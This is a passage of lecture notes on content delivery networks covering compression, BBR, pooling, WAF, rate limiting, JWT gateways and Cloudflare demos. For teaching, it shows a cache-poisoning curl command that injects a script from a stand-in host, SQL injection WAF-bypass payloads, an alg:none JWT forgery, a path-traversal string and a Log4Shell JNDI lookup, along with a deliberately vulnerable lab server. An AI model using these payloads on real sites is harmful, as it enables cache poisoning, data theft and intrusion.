🧠 **How dictionary compression works:** compressors like deflate (gzip's algorithm) and zstd find repeated strings and replace them with "copy N bytes from position P back". Normally they can only refer back within the same file. With a **dictionary**, they can also refer into a pre-shared blob. If the dictionary is *last minute's version of the same page*, almost everything is a "copy from dictionary" — only the changed headline is literal bytes.

**Railgun (Cloudflare, 2013–2024):**
- A daemon inside your origin + a sender at the edge kept the **last version of each page on both ends**, and sent only the delta. *"Caching down to the individual bytes."*
- **Retired Jan 2024** — the network got fast enough, and a standard arrived.

**RFC 9842 — Compression Dictionary Transport (Sep 2025):**
- The same idea, standardised, **browser ↔ server**: the version you already have becomes the dictionary for the next one.
- Request header: `Available-Dictionary: <sha-256>` (the hash of the dictionary the browser holds)
- Response: `Content-Encoding: dcb` / `dcz` (🧠 **d**ictionary-**c**ompressed **b**rotli / **z**standard)
- 🧠 The server marks a response as usable as a future dictionary with `Use-As-Dictionary:`.
- Also **RFC 9841** (shared brotli).
- This is Session 5's **"why not gzip the headers"** — dictionaries **leak** (🧠 compression-oracle attacks like CRIME/BREACH: if attacker-controlled text is compressed with a secret, the output size reveals the secret), so it's **same-origin, HTTPS-only, hashed**.

> A one-minute-old copy turns 24 KB into **436 bytes — ~10× past gzip**. The catch: the dictionary must be **recent** and **identical on both ends**, which is exactly what Railgun kept, and what RFC 9842 names by hash.

**Pitfall:** an old dictionary helps less (1 hour old → 1,277 B, still 3× better than gzip but 3× worse than 1-minute-old).

### 4.6 The two classic bugs: cache poisoning and cache deception

**Plain English:** a shared cache means one person's request can decide what *everyone else* receives. If the cache key doesn't capture everything that changes the response, attackers can exploit the gap.

#### The demo (`demos/poison.sh`)
```bash
$ curl -H 'X-Forwarded-Host: evil.example' edge/page/landing      # ONE attacker request
<script src="https://evil.example/app.js"></script>

$ curl edge/page/landing                                          # every visitor, next 60 s
<script src="https://evil.example/app.js"></script>      x-cache: HIT
```

#### Cache poisoning (James Kettle, "Practical Web Cache Poisoning", 2018)
```
  attacker ──GET /page/landing + X-Forwarded-Host: evil.example──▶ edge (MISS)
                                                                    │
                                     origin builds <script src="https://evil.example/app.js">
                                                                    │
                       edge stores it under key  https + host + /page/landing   ← header NOT in key!
                                                                    │
  victim   ──GET /page/landing──────────────────────────────────▶ edge (HIT) → evil script
```
- The origin **reflects a header** (`X-Forwarded-Host`) into the page. That header is **NOT in the cache key** (an *unkeyed input*).
- One malicious request caches a hostile page; everyone else is served it.
- **Fix:** drop the unkeyed header at the edge, **or** add it to the key, **or** `Vary` on it.

🧠 `X-Forwarded-Host` is a header proxies use to tell the origin what host the user originally asked for. Frameworks often use it to build absolute URLs — which is exactly what makes it dangerous.

#### Cache deception (Omer Gil, "Web Cache Deception Attack", Black Hat USA 2017)
```
  1. attacker tricks victim (logged in) into opening
       https://site/account/settings/fake.css
  2. origin ignores the junk suffix, returns the victim's PRIVATE settings page
  3. edge sees ".css" → "static! cache it" → stores the private page
  4. attacker fetches https://site/account/settings/fake.css → HIT → victim's data
```
- **Fix:** don't cache by extension alone; honour the origin's `Content-Type` (it said `text/html`, not `text/css`) and `no-store`.

| | poisoning | deception |
|---|---|---|
| who makes the cached entry | **attacker** | **victim** (tricked) |
| what's cached | attacker-controlled content | victim's private content |
| who gets hurt | all visitors | the one victim |
| root cause | unkeyed input changes the response | cache trusts URL extension over origin's headers |

> *"Both bugs are the cache key disagreeing with reality — the same root as the personalisation problem, turned into an exploit. A cache is shared state, and shared state is an attack surface."*

---

## 5 · Part 04 — Moving bytes faster

### 5.1 BBR — and it is Session 2's sawtooth

**Plain English:** BBR is a smarter way for a TCP sender to decide how fast to send. Instead of "speed up until something breaks", it *measures* the pipe and sends at exactly that rate.

**The correction** (the slide fixes the course's source doc): the source doc said *"BBR algorithm by Google … relooked at TCP retries, congestion and the famous saw-tooth."* Precisely: **BBR = Bottleneck Bandwidth and Round-trip propagation time** (Cardwell, Cheng, Gunn, Yeganeh & Jacobson, Google, ACM Queue 14(5), 2016). The saw-tooth is Session 2's slide.

**How it differs:**
- **Loss-based (CUBIC):** fill the pipe until a packet drops, then cut back sharply (🧠 Reno halves; CUBIC cuts to ~70%) — the saw-tooth. On long, lossy CDN paths it **mistakes distance for congestion** (a random loss on a long path isn't a full queue, but CUBIC slows down anyway).
- **BBR:** measure the actual **bottleneck bandwidth** and the **min RTT**, pace to that. **Loss ≠ congestion signal.**

```
 send rate
   ▲          CUBIC (loss-based)                    BBR (model-based)
   │      /|    /|    /|                       ───────────────────────────
   │     / |   / |   / |                        paces at measured bottleneck
   │    /  |  /  |  /  |                        rate; small periodic probes
   │   /   | /   | /   |
   │  /    |/    |/    |      ← drop on each loss
   └──────────────────────────▶ time
```

🧠 How BBR works, a bit deeper:
```
 BtlBw  = max delivery rate seen recently     (how fat is the narrowest pipe?)
 RTprop = min RTT seen recently                (how long is the pipe with empty queues?)
 BDP    = BtlBw × RTprop                       (bytes that fit "in flight")

 pacing rate ≈ BtlBw        inflight cap ≈ 2 × BDP
 phases: Startup (find BtlBw fast) → Drain (empty the queue it built)
         → ProbeBW (cycle slightly above/below) → ProbeRTT (briefly back off to re-measure min RTT)
```
Because it targets "full pipe, empty queue", it also keeps router buffers from filling → lower latency (hence median RTT −53%).

**Deployed:**

| deployed | who / where | result |
|---|---|---|
| Google B4 + YouTube, 2016 | the paper | **2–25×** CUBIC throughput; median RTT **−53%** globally |
| Amazon CloudFront, 2019 | edge → viewer | up to **+22%** throughput; some US mobile **+100%** |
| Akamai, Nov 2019 | media delivery | BBR on **>80%** of end-user connections |
| measured across the web, 2023 | top-10k sites | BBR now the **most-deployed CCA**; CUBIC ~7% |

(**CCA** = Congestion Control Algorithm. 🧠 **B4** is Google's private inter-datacenter WAN. Sources: AWS 2019, Akamai 2019, SIGCOMM 2024 CCA census.)

> **Only the sender changes** — no new protocol, no client, no router. That is why a CDN can just switch it on for you: it **owns the sender** on the long leg back to your origin, and the one out to the user.

🧠 On Linux: `sysctl net.ipv4.tcp_congestion_control=bbr` (plus `net.core.default_qdisc=fq` for pacing on older kernels).

**Pitfall:** "BBR needs the client to support it." No — congestion control is a sender-side decision. Your phone downloading from a BBR server benefits without knowing.

### 5.2 Pooling: reuse the origin connection, or pay the handshake every time

**Plain English:** opening a TLS connection across a continent costs 2 round trips. If the edge keeps connections to your origin open and reuses them, users don't pay that cost.

Benchmark (`python3 bench/03_pool.py`: 300 visitors, edge↔origin 50 ms, TLS 1.3, origin idle-close 1 s):

| edge configuration | origin reqs | new conns | reuse | mean TTFB |
|---|---|---|---|---|
| no pool | 300 | 300 | 0.0% | 160 ms |
| 32 worker pools | 300 | 164 | 45.3% | 112 ms |
| 8 worker pools | 300 | 52 | 82.7% | 74 ms |
| 1 shared pool | 300 | **4** | **98.7%** | **57 ms** |

🧠 Read it: with no pool, every request = TCP (1) + TLS (1) + request (1) ≈ 3 × 50 = 150 ms + processing ≈ 160 ms. With a reused connection, ≈ 1 × 50 ms ≈ 57 ms.

**Why the shared pool wins:**
- A pooled connection opened by one worker can only be reused **by that worker**.
- Split the pool across many workers and each sees too few requests to keep its connections warm **before the origin closes them** (idle-close 1 s).
- This is **nginx's per-worker pool vs Pingora's shared pool** — Session 4's Cloudflare thread.

```
 per-worker pools (nginx)                 one shared pool (Pingora)
 ┌worker1┐→ conn A                        ┌worker1┐┐
 ┌worker2┐→ conn B   each idle, closes    ┌worker2┐├──▶ shared pool: conn A, B (busy, warm)
 ┌worker3┐→ conn C   after 1 s → reopen   ┌worker3┐┘
```

**Cloudflare's Pingora, in production:** moving from per-worker nginx pools to one shared Pingora pool took one big customer's reuse from **87.1% → 99.92%** — a **160× drop** in new origin connections, and **"434 years of handshake time saved every day."** (Cloudflare, "How we built Pingora", Sep 2022.) Same shape as the bench, three orders of magnitude bigger.

🧠 Check 160×: new-connection rate went from 12.9% to 0.08% → 12.9 / 0.08 ≈ 160.

> *"Amortise the setup" — Session 3's first closing idea — now spanning a continent. The setup you're amortising is a 2-RTT TLS handshake to your origin.*

### 5.3 Multiplexing and shielding: fewer connections, fewer origin fetches

**Multiplexing (Session 5, applied to the origin):**
- HTTP/2 puts many streams on one connection; the source doc's line is *"we've discussed multiplexing already."*
- A CDN uses it on both legs — many user streams in, a few multiplexed streams back to origin.
- **But note the default: most CDN→origin hops are still HTTP/1.1.** `cloudflared`'s `http2Origin` defaults to **false**; you turn it on. **Pooling** (last slide) is what actually saves you there today.

**Tiered cache / origin shield:**
- **Without it:** 300 edges each MISS → **300 requests** hit your origin for the same object. A built-in **thundering herd** — Session 3 & 4's `cache_lock`, globally.
- **With it:** edges fetch from a **regional parent**; the parent fetches from origin **once**. Your origin sees one request, not 300.
- Cloudflare: **Tiered Cache / Argo**. nginx did the single-flight version with **`proxy_cache_lock`**.

```
  WITHOUT shield                          WITH tiered cache / shield
  edge1 ─MISS─┐                           edge1 ─MISS─┐
  edge2 ─MISS─┼──▶ origin (300 reqs)      edge2 ─MISS─┼──▶ regional parent ─MISS(1)─▶ origin (1 req)
  ...         │                           ...         │
  edge300 ────┘                           edge300 ────┘
```

**Request collapsing** at one edge (`bench/harness --collapse`: 50 users, cold cache, 1 object):
```
 without collapsing   50 origin fetches    # every miss stampedes
 with collapsing       1 origin fetch      # 49 wait for the first, then all HIT
```

🧠 nginx config for the single-PoP version:
```nginx
proxy_cache_lock on;            # only one request per key goes upstream at a time
proxy_cache_lock_timeout 5s;
proxy_cache_use_stale updating; # meanwhile serve the stale copy if we have one
```

> *Collapsing (one PoP) and tiered cache (across PoPs) are the same move at two scales: **never fetch the same object twice at once**. It is why a CDN protects your origin during a traffic spike instead of amplifying it.*

**Thundering herd** 🧠 = many clients wake up at once and all hit the same resource (e.g. a popular item expires from cache and 10,000 requests miss simultaneously).

---

## 6 · Part 05 — Everything that isn't speed

### 6.1 All your traffic already passes through it. That changes what it's for.

> *"All requests are coming to the CDN anyway…"* — the source doc, three times in a row

| feature | what it does |
|---|---|
| **WAF** (Web Application Firewall) | SQLi, XSS, path traversal — inspected before your app sees them |
| **Rate limiting** | cap requests per client, per path, before they cost you anything |
| **DDoS** (Distributed Denial of Service) protection | absorb a 31.4 Tbps flood with capacity you could never buy |
| **API gateway** | authenticate, add/strip headers, route, fall back — at the edge |

🧠 Acronyms: **SQLi** = SQL injection (attacker input changes your SQL query); **XSS** = Cross-Site Scripting (attacker script runs in other users' browsers); **path traversal** = `../../etc/passwd`-style tricks to read files outside the web root.

> **The biggest shift in what a CDN is:** it started as a cache and became the **security perimeter**, because the perimeter is wherever all the traffic converges — and for you, that is the edge. *Speed got you to adopt it; control is why you can't leave.*

### 6.2 WAF: a denylist of spellings — the bug still lives in your origin

The demo (`bash demos/waf.sh`; origin builds SQL with string formatting; edge `--waf on`):
```
 q="' OR 1=1 --"          → blocked by edge rule sqli-tautology
 q="'/**/OR/**/1=1--"     → 5 rows leak    # comments instead of spaces; regex misses
 (edge --waf full, strips comments first)
 q="'/**/OR/**/1=1--"     → blocked        # normalisation caught it…
 q="' --"                 → 5 rows leak    # …but no OR, no UNION, no digits to match
```

🧠 Why these payloads work against `f"SELECT * FROM items WHERE name = '{q}'"`:
```
 q = ' OR 1=1 --       →  ... WHERE name = '' OR 1=1 --'      (always true; -- comments out the rest)
 q = '/**/OR/**/1=1--  →  same thing; SQL treats /**/ as whitespace, the regex looking for " OR " doesn't
 q = ' --              →  closes the string and comments out whatever SQL follows
```
🧠 The slide doesn't show the lab's exact query. `' --` leaks when the query has more conditions after the input, e.g. `WHERE name LIKE '%{q}%' AND owner = 'me'`: the `--` comments out the `AND owner` filter, so you see everyone's rows. That's how a payload with **no OR, no UNION, no digits** can still leak. Either way the point holds: a WAF matches *spellings*, not *meanings*.

**The arms race is normalisation:** a WAF matches patterns in text, so the game is how much decoding it does first (raw → URL-decode → strip comments → …) vs how many ways the attacker can spell the same attack. **You never win it outright.**

**So what is a WAF FOR?** Buying time and blocking the mass-scanned, known payloads (**Log4Shell**, the **OWASP** top patterns) — a real, useful layer. **The actual fix is in the origin: bind parameters.** `demos/waf.sh` ends by turning on `--safe`, and every bypass returns "no results."

```python
# 🧠 the fix, in Python sqlite3
cur.execute("SELECT * FROM items WHERE name = ?", (q,))   # q is data, never code
```

- 🧠 **Log4Shell** (CVE-2021-44228, Dec 2021): a Java logging-library bug where logging `${jndi:ldap://evil/x}` made the server download and run attacker code. WAFs blocked the obvious strings within hours while people patched.
- 🧠 **OWASP** = Open Worldwide Application Security Project; the **OWASP Core Rule Set** is a widely used generic WAF ruleset.
- Lab: `edge/waf.py` has **5 rules, 3 normalisation levels**. Cloudflare's **Free Managed Ruleset** is on all plans; the **OWASP Core** ruleset needs **Pro**.

**Pitfall:** "We have a WAF, so SQL injection is handled." No — the WAF reduces noise; the vulnerability is still in your code.

### 6.3 Rate limiting: "100 per 10 seconds" has at least five different meanings

Benchmark (`python3 bench/07_ratelimit.py`, limit 100 / 10 s, simulated time):

| algorithm | burst at the window edge | normal page load |
|---|---|---|
| fixed window | **200 in one second !!** | all pass |
| sliding log (exact) | 100 | all pass |
| sliding window (estimate) | 104 | all pass |
| token bucket | 109 | all pass |
| leaky bucket, burst=0 | 10 | **97% refused !!** |

🧠 The five algorithms, from scratch:

```
 FIXED WINDOW     Counter per 10-s block [0-10), [10-20)… Reset to 0 at each boundary.
                  Cheap (1 counter). Flaw: boundary burst.

 SLIDING LOG      Store a timestamp for every request; count those in the last 10 s.
                  Exact. Expensive (memory per request).

 SLIDING WINDOW   Two counters: previous window, current window.
 (estimate)       estimate = prev × (overlap fraction) + current
                  Cheap and nearly exact.

 TOKEN BUCKET     Bucket holds up to B tokens, refills at R tokens/s.
                  Each request spends one. Allows bursts up to B, then rate R.

 LEAKY BUCKET     Requests queue and "leak" out at a fixed rate (here 10/s).
                  burst=0 → anything faster than the drip is refused.
```

**The two failure modes:**
- **Fixed window:** 100 at 9.999 s + 100 at 10.001 s = **200 in a blink**. Cloudflare's **free plan only offers this 10 s window**.
```
  window 1 [0s ─────────── 10s)  window 2 [10s ─────────── 20s)
                         ▲▲▲▲ ▲▲▲▲
                    100 reqs│ │100 reqs   → 200 in ~2 ms, both windows say "OK, ≤100"
```
- **Leaky bucket with no burst:** mathematically pure, but **refuses a real browser that opens 30 requests at once** (HTML + CSS + JS + images). That's why nginx's `limit_req` has a **`burst`** parameter — Session 4's self-study.

```nginx
# 🧠 nginx: 10 req/s average, allow a burst of 30 queued/served immediately
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
location /api/ { limit_req zone=api burst=30 nodelay; }
```

**Cloudflare's real answer (2017, "Counting things"):** the **sliding-window estimate** — weight the previous window by how much still overlaps. **Two counters per client.** Measured across **400M requests**: only **0.003%** wrongly allowed or blocked. Cheap and close enough.

```python
# 🧠 sliding-window estimate
def allowed(prev_count, curr_count, elapsed_in_curr, window=10, limit=100):
    overlap = (window - elapsed_in_curr) / window      # how much of prev window still "counts"
    estimate = prev_count * overlap + curr_count
    return estimate < limit
# e.g. 3 s into the current window, prev=80, curr=40 → 80*0.7 + 40 = 96 → allowed
```

**Geography matters too:** counts are **per data-center, not global** — a botnet spread across 330 cities gets **330 budgets**. The algorithm and the geography both matter.

Lab: `edge/ratelimit.py` (uses the nginx `limit_req` "excess" formula).

### 6.4 DDoS: the one thing you genuinely cannot do yourself

| number | meaning |
|---|---|
| **31.4 Tbps** | largest DDoS on record (Cloudflare, Dec 2025). **Aisuru** botnet, **1–4M devices**. Lasted **35 seconds**. |
| **auto** | mitigated automatically, no human in the loop. You cannot buy 31 Tbps of inbound to soak this. |
| **~500 Tbps** | Cloudflare's total network capacity, across 330+ cities — the pool the flood lands in. |

(Source: Cloudflare Q4-2025 DDoS report — "Aisuru-Kimwolf".)

**Why only a CDN can do this:** a **volumetric** flood is won with **more capacity than the attacker**, spread across enough locations that **anycast splits the flood across all of them** (Session 2). Your origin has one pipe; the CDN has hundreds. This is the purest case of *"rent capacity you could never own"* — and it's why sites move behind a CDN **the day after** an attack, not before.

```
  botnet devices worldwide
   │ │ │ │ │ │ │ │ │ │
   ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼          anycast: each bot's packets go to ITS nearest PoP
  [BOM][SIN][LHR][IAD][FRA]...   31.4 Tbps / 330 PoPs ≈ ~0.1 Tbps each → survivable
                  │
              your origin (sees only clean traffic)
```

**The catch (Session 7 preview):** the flip side of one network absorbing everyone's attacks is one network being **everyone's single point of failure**. **June 2021:** a Fastly config bug took **85%** of its network to errors — Reddit, Spotify, the UK government, gone at once. *Concentration cuts both ways.*

🧠 Also note: a CDN only protects what's *behind* it. If attackers know your origin IP, they can flood it directly → keep it secret / firewall it (see next section).

### 6.5 API gateway: authenticate, scrub, route — at the edge

The demo (`bash demos/gateway.sh`; edge verifies the JWT; origin only trusts the edge):
```
 no token                    → 401 edge: missing bearer token   # origin never sees it
 valid JWT                   → {"user":"alice","orders":[…]}    # edge sets X-User
 expired JWT                 → 401 edge: expired
 alg:none forgery            → 401 edge: alg 'none' refused     # never let the token pick
 client sends X-User: admin  → ignored — edge overwrites the identity it derived
 attacker hits origin IP     → {"orders":[EVERYTHING]}   !! the edge is bypassed
```

Line by line:
- **missing bearer token** — 🧠 `Authorization: Bearer <jwt>`; no token → rejected at the edge, origin is never bothered.
- **valid JWT** — edge verifies signature + expiry, then adds `X-User: alice` for the origin.
- **expired JWT** — the `exp` claim is in the past.
- **`alg: none` forgery** — 🧠 the JWT spec allows an "unsigned" algorithm `none`. Naive libraries read the header, see `none`, and skip verification — so an attacker writes any payload with no signature. Rule: **"never let the token pick"** the algorithm; the server decides (here, HS256 only).
- **client sends `X-User: admin`** — ignored; the edge **overwrites** the identity it derived. (If it just passed client headers through, anyone could claim to be admin.)
- **attacker hits origin IP** — the killer line. The origin trusts `X-User` blindly, so going around the edge gets everything.

**The gateway is only real if the origin can't be reached directly.** Put auth at the edge and leave the origin open, and an attacker just skips the edge. Fixes:
- **Mutual TLS (authenticated origin pulls)** — 🧠 the origin demands a *client* certificate during TLS, and only the CDN has it.
- **A Tunnel** (`cloudflared`) — 🧠 the origin makes an *outbound* connection to the CDN, so it needs no open inbound port at all.

The origin then only answers clients holding the edge's certificate. `demos/gateway.sh` ends by turning that on: the direct request gets **"connection reset"**, the edge still works.

**Header hygiene too:** the origin leaks `X-Powered-By: PHP/5.4.45` (telling attackers exactly which old, vulnerable version you run); the edge strips it.

Lab: `edge/jwtlite.py` (HS256, WebCrypto) · `cloudflare/worker-gateway` (same logic, run in workerd).

```
           ┌───────── edge ─────────┐
 client ──▶│ verify JWT (HS256 only)│──X-User: alice──▶ origin (mTLS / tunnel only)
           │ strip client X-User    │                    ▲
           │ strip X-Powered-By     │                    │  ✗ attacker → direct IP:
           └────────────────────────┘                       connection reset
```

---

## 7 · Part 06 — Cloudflare, hands-on

### 7.1 Six things you can run on a laptop, no account

```bash
# 1 which building answered you
$ curl -s https://www.cloudflare.com/cdn-cgi/trace | grep -E 'colo|tls|kex'

# 2 anycast: one IP, which city?
$ dig +short CHAOS TXT id.server @1.1.1.1        # → "BOM"

# 3 the headers a CDN adds
$ curl -sI https://www.cloudflare.com/ | grep -iE 'cf-ray|cf-cache|age|alt-svc'

# 4 physics: same handshake, Mumbai vs Virginia (AWS regional endpoints)
$ curl -w 'tls %{time_appconnect}s\n' -so /dev/null \
       https://dynamodb.ap-south-1.amazonaws.com/ping      # vs us-east-1

# 5 put YOUR laptop behind the edge (install cloudflared first)
$ python3 tools/echo_server.py 8000                       # terminal 1
$ cloudflared tunnel --url http://localhost:8000          # → https://<rand>.trycloudflare.com
```
(The sixth thing: open **radar.cloudflare.com** and **speed.cloudflare.com** in a browser.)

**The quick-tunnel demo is the one to do together:**
- That random URL puts your laptop behind Cloudflare's edge **in seconds — no account, no DNS**. Share it; the class opens it.
- `tools/echo_server.py` prints each request's:
  - **`CF-Connecting-IP`** — the real visitor IP (since the TCP connection now comes from Cloudflare)
  - **`CF-Ray`** with the visitor's colo
  - **`CDN-Loop`** — 🧠 a header CDNs add to detect requests looping through themselves
  - and **how few TCP connections `cloudflared` uses for the whole room** (that's the pool).
- **Limits:** 200 in-flight requests, **no Server-Sent Events**, testing only.

Source: `cloudflare/no-account.sh` (every command, runnable) · trycloudflare.com quick tunnels.

### 7.2 The dashboard demos — free plan, one zone (instructor drives)

| do this | in the dashboard | the point | free-plan limit |
|---|---|---|---|
| orange vs grey cloud | DNS → toggle proxy | `dig` shows origin IP vanish behind anycast | — |
| cache an HTML page | Cache → Cache Rules | MISS→HIT→purge→MISS; `Age` climbs | 10 rules |
| block naive SQLi | Security → WAF custom rule | same bypasses as `demos/waf.sh` | 5 rules, no regex |
| rate-limit `/api/*` | Security → Rate limiting | ~20 pass then **429**; per-colo counts | 1 rule, 10 s only |
| strip `X-Powered-By` | Rules → Transform Rules | header hygiene, no code | unlimited |
| deploy a Worker | `wrangler deploy` | your code at the edge (next slide) | 100k req/day |

- 🧠 **Zone** = a domain you've added to Cloudflare.
- 🧠 **Orange cloud** = "proxied" — DNS returns Cloudflare's anycast IPs, traffic flows through the edge. **Grey cloud** = "DNS only" — DNS returns your real origin IP; Cloudflare is just your DNS provider.
- 🧠 **429 Too Many Requests** = the HTTP status for rate-limited.
- 🧠 **wrangler** = Cloudflare's CLI for Workers.

**The limits are themselves the lesson:** a WAF rule with no regex is why `demos/waf.sh`'s bypasses matter; a 10-second-only rate window is exactly the **fixed-window weakness** (slide 22); HTML not cached until you add a Cache Rule is the **default-extension rule** (slide 11). *"The constraints teach the concepts."* Full step-by-step is in `cloudflare/INSTRUCTOR.md`.

### 7.3 Workers: the edge runs your code — Session 3's question, answered again

```js
// worker-gateway: the API gateway demo, as a real Worker
export default {
  async fetch(request, env) {
    const { success } = await env.LIMITER.limit({ key: ip });   // rate limit
    const claims = await verifyJwt(token, env.JWT_SECRET);      // WebCrypto
    headers.set('X-User', claims.sub);
    return fetch(origin, { headers });                          // primary→backup
  }
}   // verified in workerd: node test_workers.mjs
```
🧠 Reading it:
- `export default { async fetch(request, env) }` — every incoming HTTP request calls this function. `env` holds bindings (secrets, the rate limiter, KV stores…).
- `env.LIMITER.limit({key: ip})` — Cloudflare's built-in rate-limit binding, keyed by client IP.
- `verifyJwt(token, env.JWT_SECRET)` — checks the HS256 signature using **WebCrypto** (the browser-standard crypto API, available in Workers).
- `headers.set('X-User', claims.sub)` — overwrite the identity header (the gateway rule from §6.5).
- `return fetch(origin, …)` — forward to origin; the real version falls back primary → backup.
- (The slide is abridged: `ip`, `token`, `headers`, `origin` are derived from the request in the full code.)

**Session 3 asked: "isn't everything a web server?"** The history of running code per request:
```
 CGI         fork + exec a new process for EVERY request     (slow)
 FastCGI     keep processes warm, reuse them                 (better)
 nginx       one event loop handles thousands of conns       (fast)
 Worker      a V8 isolate, not a process                     (edge)
             starts in ~5 ms, ~3 MB
             vs ~35 MB + cold-start of a container
```
🧠 **V8** is Chrome's JavaScript engine. An **isolate** is a lightweight sandbox inside one V8 process — thousands of customers' code run in the same process, each isolated in memory, so there's no OS process or container to boot.

**Amortise the setup, one more time:** no fork+exec per request (Session 3's CGI cost); no VM to boot. The runtime is **already resident in every PoP**; your code just runs in it. It is prefork / FastCGI / servlets — the same closing idea — taken to the edge. (Source: Cloudflare, "Cloud computing without containers", 2018.)

**What actually ran here:**
- Both Workers in `cloudflare/` were executed locally in **workerd** (Cloudflare's real runtime, via **Miniflare**) against the lab origin.
- The **gateway Worker** reproduced every line of `demos/gateway.sh` — 401 on no token, `alg:none` refused, failover to backup.
- The **ESI Worker**'s assembled page was checked byte-for-byte against the origin's own — and there's a **framing bug** in it (why not **HTMLRewriter**) that is Session 2's *"where does this element end?"* all over again. Story's in the README.

🧠 **HTMLRewriter** is Cloudflare's streaming HTML parser API for Workers. The hint: if you find `<esi:include .../>` with naive string search on a *stream*, a tag can be split across two chunks — the same "where does one message end and the next begin?" framing problem as TCP byte streams.

**Pitfall:** "edge compute = a tiny server in each city that I can run anything on." Isolates have limits (CPU time per request, memory, no arbitrary native binaries). They suit request/response logic — auth, routing, rewriting — not your database.

---

## 8 · Part 07 — Closing: the bill, the four ideas, the repo

### 8.1 The bill: what you hand over when you put a stranger in the middle

| what you hand over | detail |
|---|---|
| **Your TLS private keys** | The edge terminates HTTPS, so it holds the keys (or its own cert for your domain). **It can read every byte.** That is the deal. |
| **A single point of failure** | Fastly, **8 Jun 2021**: one customer's config change → **85%** of the network to errors → Reddit, Spotify, gov.uk down. **49 min** to recover. |
| **The power to see and shape traffic** | **Domain fronting** used CDNs to hide censored traffic behind innocent domains — until **AWS, Google (2018), Fastly (2024)** all banned it (Azure 2022 too). *Whoever runs the edge decides what flows.* |
| **Lock-in by architecture** | Once WAF, rate limits, auth and Workers live at the edge, it is not a cache you swap — **it is your security perimeter**. |

🧠 **Domain fronting** explained: in HTTPS, the domain you're connecting to appears in plaintext in the TLS **SNI** (Server Name Indication) field, but the HTTP `Host` header is inside the encryption. A censored app would put `allowed-site.com` in SNI (censor sees that, lets it through) and `blocked-app.com` in the `Host` header; the CDN, which hosts both, routes by `Host`. Blocking it means blocking the whole CDN. CDNs banned it by requiring SNI and Host to match.

> *"A CDN is enormous leverage rented cheaply — and the rent is **trust, concentration, and dependence**. Use it. Know the bill."*

### 8.2 The four ideas

1. **Move the work, or move the data.** You cannot beat the speed of light, so you move content closer (the cache) or push personalisation outward (SSI → ESI → Ajax) until only the shared part travels far. Every CDN trick is one of these two moves.
2. **The edge is wherever all the traffic converges.** Caching routed everything through the edge; so the firewall, the rate limiter, the DDoS scrubber, the auth and now your code all followed the traffic there. Speed made you adopt it; control is why it's now your perimeter.
3. **It's all Sessions 2–5, rented by the city.** Reverse proxy (S4), connection pool (S3), ETag revalidation (S5), BBR vs the sawtooth (S2), multiplexing (S5), consistent hashing, framing (S2). A CDN invents almost nothing — it distributes what you already know.
4. **Concentration cuts both ways.** One network can absorb a 31 Tbps flood no one could survive alone — and one config bug in it takes 85% of the web down at once. The same pooling that is your strongest defence is your single point of failure.

### 8.3 The repo: `cdn-lab` — every number today came out of this, with no network

```bash
$ ./setup.sh       # a private CA + 3 certs. openssl only.
$ ./run_all.sh     # 7 benches + 6 demos, ~80 s, no network
```

| file | what it is |
|---|---|
| `origin/origin.py` | the naive app server (trusts `X-User`, f-string SQL, leaks headers) — deliberately vulnerable |
| `edge/edge.py` | a CDN PoP in one file: cache · pool · WAF · rate limit · JWT · ESI (~450 lines) |
| `tools/laggy.py` | a TCP proxy that adds distance (the physics floor) |
| `cloudflare/` | `no-account.sh` · `INSTRUCTOR.md` · two Workers (run in workerd) |

Benches seen in the lecture: `bench/01_physics.py`, `02_split_tcp.py`, `03_pool.py`, `04_esi_bytes.py`, `05_delta.py`, `06_consistent_hash.py`, `07_ratelimit.py`. Demos: `cache.sh`, `poison.sh`, `waf.sh`, `gateway.sh`, `failover.sh`.

**Honest about what it does NOT model:**
- `laggy.py` **delays, it never drops** — no loss, no bandwidth limit (BBR vs CUBIC needs `tc netem`, homework 2).
- Every hop is **HTTP/1.1**.
- **Anycast and BGP can't live on one machine** — use `cloudflare/no-account.sh` for those.
- The worker-pool bench assigns each visitor a **random simulated worker** rather than a real kernel accept queue.
- Where a number is a model and not a measurement, the slide and the README say so.

> Read `edge/edge.py` end to end — it is ~450 lines and it is the whole lecture as code. Then break it: set `--pool 0` and watch reuse collapse, `--waf off` and watch the injection land.

---

## 9 · Hands-on section: run it yourself

All of these work with no Cloudflare account. Outputs will vary by your location and network.

### 9.1 Which PoP answered you?
```bash
curl -s https://www.cloudflare.com/cdn-cgi/trace
```
Expected (shape):
```
fl=...
h=www.cloudflare.com
ip=<your public IP>
ts=...
visit_scheme=https
uag=curl/8.x
colo=BOM            ← airport code of the PoP
http=http/2         ← (curl may say http/1.1 or http/2 depending on build)
loc=IN
tls=TLSv1.3
sni=plaintext
warp=off
kex=X25519MLKEM768  ← only if your curl/OpenSSL supports post-quantum; otherwise X25519
```
**What it shows:** anycast in action. Try it on Wi-Fi, then on phone hotspot / mobile data. Different `colo`, same domain.

### 9.2 Which 1.1.1.1 resolver answered?
```bash
dig +short CHAOS TXT id.server @1.1.1.1
```
Expected: one quoted airport code, e.g. `"BOM"`. **Shows:** DNS resolvers are anycast too.

### 9.3 Headers a CDN adds
```bash
curl -sI https://www.cloudflare.com/ | grep -iE 'cf-ray|cf-cache|age|alt-svc'
```
Expected (shape):
```
cf-cache-status: HIT / DYNAMIC / ...
age: 1234                       ← seconds in cache (only on cached responses)
cf-ray: 8c1a2b3c4d5e6f70-BOM    ← request id + colo
alt-svc: h3=":443"; ma=86400    ← "I also speak HTTP/3 on UDP 443"
```
🧠 `alt-svc` is how a server advertises HTTP/3 — the browser switches to QUIC on later requests.

### 9.4 Physics: same handshake, near vs far
```bash
curl -w 'tls %{time_appconnect}s\n' -so /dev/null https://dynamodb.ap-south-1.amazonaws.com/ping
curl -w 'tls %{time_appconnect}s\n' -so /dev/null https://dynamodb.us-east-1.amazonaws.com/ping
```
`time_appconnect` = seconds until TCP + TLS handshake completed. From India expect roughly tens of ms for `ap-south-1` (Mumbai) vs several hundred ms for `us-east-1` (Virginia) — because it's ~2 RTTs of ~200+ ms each.

🧠 Get a full timing breakdown:
```bash
curl -so /dev/null -w 'dns %{time_namelookup}  tcp %{time_connect}  tls %{time_appconnect}  ttfb %{time_starttransfer}  total %{time_total}\n' https://example.com/
```

### 9.5 Compute the speed-of-light floor yourself (🧠 mini version of `bench/01`)
```python
import math
def great_circle_km(lat1, lon1, lat2, lon2):
    R = 6371
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dp, dl = p2 - p1, math.radians(lon2 - lon1)
